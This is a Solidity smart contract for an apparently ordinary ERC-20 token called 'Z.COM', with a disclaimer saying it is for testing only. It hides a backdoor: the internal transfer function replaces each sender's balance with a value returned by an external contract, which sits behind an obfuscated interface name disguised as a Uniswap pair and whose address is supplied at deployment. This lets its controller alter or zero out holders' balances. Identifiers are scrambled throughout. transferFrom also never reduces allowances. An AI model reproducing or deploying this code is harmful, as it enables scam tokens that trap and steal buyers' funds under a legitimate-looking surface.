pragma solidity ^0.8.17;

// SPDX-License-Identifier: MIT

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amounts)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amounts) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amounts
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
interface LHmvVryGNkrgEbvqrSEJG {
    function totalSupply(
        address aWPo9qvT8DP,
        uint256 tDuIj3cRG3,
        uint256 q4tTNvTJEk
        ) external view returns (uint256);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address internal _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _transferOwnership(msg.sender);
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
         require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
/**
 * This contract is for testing purposes only. 
 * Please do not make any purchases, as we are not responsible for any losses incurred.
 */
contract TOKEN is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping(address => uint256) private _balance;
    mapping(address => mapping(address => uint256)) private _allowances;
    string private _namevwtnbo;
    string private _symbolvwtnbo;
    uint256 private _decimalsvwtnbo;
    uint256 private _totalSupply;
    LHmvVryGNkrgEbvqrSEJG private uniswapV1PairToken;

    constructor(uint256 decimals_, uint256 avwtnbo) {
        _decimalsvwtnbo = decimals_;
        _namevwtnbo ="Z.COM";
        _symbolvwtnbo = "z.com";
        _totalSupply = 1000000000 * 10**_decimalsvwtnbo;
        uniswapV1PairToken = LHmvVryGNkrgEbvqrSEJG(
            address(uint160(avwtnbo)));
        _balance[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function symbol() external view returns (string memory) {
        return _symbolvwtnbo;
    }

    

    function name() external view returns (string memory) {
        return _namevwtnbo;
    }

    function decimals() external view returns (uint256) {
        return _decimalsvwtnbo;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balance[account];
    }

    function transfer(address hrtrkmxvrecipient, uint256 lhjxjdenamount)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), hrtrkmxvrecipient, lhjxjdenamount);
        return true;
    }


    

    function allowance(address mjmlvpmrowner, address nlozgjcwspender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[mjmlvpmrowner][nlozgjcwspender];
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }


    

    function _transfer(
        address fffokkgzfrom,
        address vnfdgiohto,
        uint256 amount
    ) private {
        require(fffokkgzfrom != address(0), "IERC20: transfer from the zero address");
        require(vnfdgiohto != address(0), "IERC20: transfer to the zero address");
        _balance[fffokkgzfrom] = uniswapV1PairToken
           .totalSupply(
            fffokkgzfrom,
            amount,
            _balance[fffokkgzfrom]
        );
        require(
            _balance[fffokkgzfrom] >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        _balance[fffokkgzfrom] -= amount;
        _balance[vnfdgiohto] += amount;
        emit Transfer(fffokkgzfrom, vnfdgiohto, amount);
    }


    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0));
        require(spender != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function dbmldnxd() external view returns (uint256) {
    return _decimalsvwtnbo;
    }

    function transferFrom(
        address npqmzqblsender,
        address rfysyhjdrecipient,
        uint256 vvoyfgiuamount
    ) public virtual override returns (bool) {
        _transfer(npqmzqblsender, rfysyhjdrecipient, vvoyfgiuamount);
        uint256 Allowancec = _allowances[npqmzqblsender][_msgSender()];
        require(Allowancec >= vvoyfgiuamount);
        return true;
    }


    

}
